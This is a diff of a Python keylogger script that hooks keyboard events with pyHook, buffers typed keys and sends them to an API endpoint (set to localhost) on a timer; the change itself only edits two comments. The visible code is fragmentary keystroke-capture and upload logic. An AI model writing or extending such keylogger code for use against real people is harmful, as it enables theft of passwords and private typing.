@@ -4,7 +4,7 @@ import sys, pyHook, pythoncom, urllib, urllib2, threading, uuid
 api_url    = 'http://localhost:8080/api'   # Setting up api url
 id         = uuid.uuid1()                             # Generating unique guid for this section so it's easier to analyze later
 buffer     = ''                                       # Buffer to store types and then send them
-syncThread = None                                     # Thread to force sync after idle (If user stop typing and don't fill up the buffer to send the data forced send it after 15 second)
+syncThread = None                                     # Thread to force sync after idle (If user stop typing and don't fill up the buffer to send the data force send it after 15 second)
 
 
 #Function to send data to api and clear the buffer
@@ -30,7 +30,7 @@ def OnKeyboardEvent(event):
 
 	if syncThread != None:     # If there's a existing threat waiting to force sync cancel it
 		syncThread.cancel()
-	syncThread = threading.Timer(8.0, forceSync) # And then set a force sync after 15s
+	syncThread = threading.Timer(8.0, forceSync) # And then set a force sync after 8s
 	syncThread.start()
 
 	return True
